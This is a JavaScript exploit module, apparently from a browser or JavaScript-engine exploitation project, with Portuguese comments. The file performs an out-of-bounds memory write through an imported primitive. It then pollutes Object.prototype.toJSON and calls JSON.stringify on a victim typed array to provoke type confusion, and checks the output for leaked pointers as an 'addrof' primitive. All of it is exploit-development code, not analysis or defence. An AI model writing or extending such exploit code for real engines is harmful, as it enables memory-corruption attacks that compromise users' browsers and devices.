// js/script3/testArrayBufferVictimCrash.mjs (v31_ExploitProbeDetailsObject)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V31_EPDO = "OriginalHeisenbug_TypedArrayAddrof_v31_ExploitProbeDetailsObject";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v31 = null;
let object_to_leak_B_v31 = null;
let victim_typed_array_ref_v31 = null; 
let probe_call_count_v31 = 0;
// Esta variável armazenará a REFERÊNCIA ao objeto current_call_details da chamada ANTERIOR da sonda.
let prev_call_details_ref_v31 = null; 
// Esta armazenará uma CÓPIA dos detalhes da ÚLTIMA chamada da sonda para o resultado final.
let last_call_details_snapshot_v31 = null;

const PROBE_CALL_LIMIT_V31 = 5; 


function toJSON_TA_Probe_ExploitDetailsObject() {
    probe_call_count_v31++;
    const call_num = probe_call_count_v31;
    
    // current_call_details é o objeto que descreve ESTA chamada da sonda.
    // Se 'this' for prev_call_details_ref_v31, então current_call_details descreverá
    // o que aconteceu com prev_call_details_ref_v31 quando ele foi 'this'.
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v31_ExploitProbeDetailsObject",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v31),
        this_is_prev_details_obj: (this === prev_call_details_ref_v31 && prev_call_details_ref_v31 !== null),
        leaked_A_assigned_to_this: null, // Para rastrear o objeto real, não apenas um booleano
        leaked_B_assigned_to_this: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsPrevDetailsObj? ${current_call_details.this_is_prev_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V31) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            // Snapshot final antes de retornar o objeto de parada
            last_call_details_snapshot_v31 = { ...current_call_details };
            return { recursion_stopped_v31: true, call: call_num };
        }

        if (current_call_details.this_is_prev_details_obj && current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON PREV_PROBE_DETAILS_OBJECT ('this')! Attempting writes...`, "vuln");
            
            // 'this' é o prev_call_details_ref_v31 (que era o current_call_details da chamada anterior)
            // e está confuso. Escrevemos nele.
            if (object_to_leak_A_v31) this.leaky_A_payload = object_to_leak_A_v31;
            if (object_to_leak_B_v31) this.leaky_B_payload = object_to_leak_B_v31;
            
            // Atualizar current_call_details para refletir o que aconteceu com 'this'
            current_call_details.leaked_A_assigned_to_this = this.leaky_A_payload; 
            current_call_details.leaked_B_assigned_to_this = this.leaky_B_payload;
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Writes to 'this' (prev_probe_details_ref_v31) attempted. 'this' keys: ${Object.keys(this).join(',')}`, "info");
            
            // Atualiza o snapshot global com este current_call_details que descreve a interação com o prev_call_details_ref_v31
            last_call_details_snapshot_v31 = { ...current_call_details };
            prev_call_details_ref_v31 = current_call_details; // O current desta chamada se torna o prev da próxima
            return this; // Retorna o 'this' modificado (que era prev_call_details_ref_v31)
        } else if (current_call_details.this_type === '[object Object]') {
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an unexpected [object Object]. No payload writes.`, "warn");
             // Este 'this' não é o que esperávamos (prev_call_details_ref_v31).
             // Atualizar prev_call_details_ref_v31 para ESTE current_call_details.
             prev_call_details_ref_v31 = current_call_details;
             last_call_details_snapshot_v31 = { ...current_call_details };
             return this; // Retornar este 'this' para ver se ele se torna o próximo 'this' confuso
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    // Se for a primeira chamada, ou se 'this' não for [object Object]
    prev_call_details_ref_v31 = current_call_details;
    last_call_details_snapshot_v31 = { ...current_call_details };
    return current_call_details; // Retorna o objeto de detalhes desta chamada
}

export async function executeTypedArrayVictimAddrofTest_ExploitProbeDetailsObject() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V31_EPDO}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ExploitProbeDetailsObject) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V31_EPDO} Init...`;

    probe_call_count_v31 = 0;
    prev_call_details_ref_v31 = null; 
    last_call_details_snapshot_v31 = null;
    victim_typed_array_ref_v31 = null; 
    object_to_leak_A_v31 = { marker: "ObjA_TA_v31epdo", id: Date.now() }; 
    object_to_leak_B_v31 = { marker: "ObjB_TA_v31epdo", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    
    let addrof_Victim_A = { success: false, msg: "VictimA: Default" };
    let addrof_Output_LeakyA = { success: false, msg: "Output.leaky_A: Default"};
    let addrof_Output_LeakyB = { success: false, msg: "Output.leaky_B: Default"};

    const fillPattern = 0.31313131313131;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v31 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v31.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v31 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ExploitDetailsObject, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v31); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            logS3(`  EXECUTE: Captured details of LAST probe run (last_call_details_snapshot_v31): ${last_call_details_snapshot_v31 ? JSON.stringify(last_call_details_snapshot_v31) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmed = false;
            if (last_call_details_snapshot_v31 && 
                last_call_details_snapshot_v31.this_type === "[object Object]" &&
                last_call_details_snapshot_v31.this_is_prev_details_obj) { // Foco na confusão do objeto de detalhes anterior
                heisenbugConfirmed = true;
            }
            logS3(`  EXECUTE: Heisenbug on prev_probe_details_obj ${heisenbugConfirmed ? "CONFIRMED" : "NOT Confirmed"}. Last probe 'this' type: ${last_call_details_snapshot_v31 ? last_call_details_snapshot_v31.this_type : 'N/A'}`, heisenbugConfirmed ? "vuln" : "error", FNAME_CURRENT_TEST);
                
            logS3("STEP 3: Checking victim buffer (expected unchanged)...", "warn", FNAME_CURRENT_TEST);
            if (float64_view_on_victim_buffer[0] !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${float64_view_on_victim_buffer[0]}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;
            
            logS3("STEP 4: Checking stringifyOutput_parsed for leaked properties...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
                 if (stringifyOutput_parsed.probe_variant === "TA_Probe_Addrof_v31_ExploitProbeDetailsObject") { // stringifyOutput é o details_obj da P1
                    logS3("  stringifyOutput_parsed IS the details_obj from Probe Call #1.", "info");
                    const output_val_A = stringifyOutput_parsed.leaky_A_payload;
                    if (typeof output_val_A === 'number' && output_val_A !==0) {
                        let out_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_A]).buffer)[0], new Uint32Array(new Float64Array([output_val_A]).buffer)[1]);
                        if (out_A_int64.high() < 0x00020000 || (out_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_Output_LeakyA.success = true; addrof_Output_LeakyA.msg = `Possible pointer for leaky_A_payload: ${out_A_int64.toString(true)}`;
                        } else { addrof_Output_LeakyA.msg = `leaky_A_payload is num but not ptr: ${output_val_A}`; }
                    } else if (output_val_A === object_to_leak_A_v31) {
                         addrof_Output_LeakyA.success = true; addrof_Output_LeakyA.msg = "object_to_leak_A_v31 identity in leaky_A_payload.";
                    } else { addrof_Output_LeakyA.msg = `leaky_A_payload not ptr. Val: ${output_val_A}`; }

                    const output_val_B = stringifyOutput_parsed.leaky_B_payload;
                     if (typeof output_val_B === 'number' && output_val_B !==0) {
                        let out_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_B]).buffer)[0], new Uint32Array(new Float64Array([output_val_B]).buffer)[1]);
                        if (out_B_int64.high() < 0x00020000 || (out_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_Output_LeakyB.success = true; addrof_Output_LeakyB.msg = `Possible pointer for leaky_B_payload: ${out_B_int64.toString(true)}`;
                        } else { addrof_Output_LeakyB.msg = `leaky_B_payload is num but not ptr: ${output_val_B}`; }
                    } else if (output_val_B === object_to_leak_B_v31) {
                         addrof_Output_LeakyB.success = true; addrof_Output_LeakyB.msg = "object_to_leak_B_v31 identity in leaky_B_payload.";
                    } else { addrof_Output_LeakyB.msg = `leaky_B_payload not ptr. Val: ${output_val_B}`; }
                 } else {
                    addrof_Output_LeakyA.msg = "stringifyOutput was not the expected P1 details object.";
                    addrof_Output_LeakyB.msg = "stringifyOutput was not the expected P1 details object.";
                 }
            } else {
                 addrof_Output_LeakyA.msg = "stringifyOutput was not an object or was null.";
                 addrof_Output_LeakyB.msg = "stringifyOutput was not an object or was null.";
            }

            if (addrof_Output_LeakyA.success || addrof_Output_LeakyB.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V31_EPDO}: AddrInDetailsObj SUCCESS!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V31_EPDO}: PrevDetailsObjTC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V31_EPDO}: No PrevDetailsObjTC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str; // Captura o TypeError aqui
            logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V31_EPDO}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V31_EPDO} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v31}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: ${addrof_Victim_A.msg}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Output.leaky_A: Success=${addrof_Output_LeakyA.success}, Msg='${addrof_Output_LeakyA.msg}'`, addrof_Output_LeakyA.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Output.leaky_B: Success=${addrof_Output_LeakyB.success}, Msg='${addrof_Output_LeakyB.msg}'`, addrof_Output_LeakyB.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v31 = null; 
        prev_call_details_ref_v31 = null; 
        last_call_details_snapshot_v31 = null;
        probe_call_count_v31 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: last_call_details_snapshot_v31, 
        total_probe_calls: probe_call_count_v31,
        addrof_Output_Leaky_A: addrof_Output_LeakyA,
        addrof_Output_Leaky_B: addrof_Output_LeakyB
    };
}
